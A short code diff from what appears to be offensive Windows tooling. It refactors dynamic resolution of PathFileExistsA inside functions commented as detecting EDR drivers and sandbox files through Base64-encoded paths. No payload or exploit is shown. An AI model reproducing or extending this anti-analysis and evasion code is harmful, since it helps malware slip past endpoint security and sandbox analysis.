@@ -8,9 +8,6 @@
 #include <wincrypt.h>
 #include <shlwapi.h>
 
-// Dynamic API Resolution
-BOOL(WINAPI *pPathFileExistsA)(LPCSTR) = NULL;
-
 // EDR Detection: Scan system driver directory for known EDR drivers
 bool DetS() {
     const char* edrDrivers[] = {
@@ -61,11 +58,9 @@ bool DetSl() {
 
 // Sandbox Detection files using Base64 Encoding
 bool DetSBF() {
-    // Resolve API Function Dynamically
-    if (!pPathFileExistsA) {
-        pPathFileExistsA = (BOOL(WINAPI*)(LPCSTR))ResolveFn("hShlwapi.dll", "PathFileExistsA");
-        if (!pPathFileExistsA) return false;
-    }
+
+    pMod pPathFileExistsA = GetMod("hShlwapi.dll", "PathFileExistsA");
+    if (!pPathFileExistsA) return false;
 
     // Base64 Encoded Paths
     const char* encodedPaths[] = {
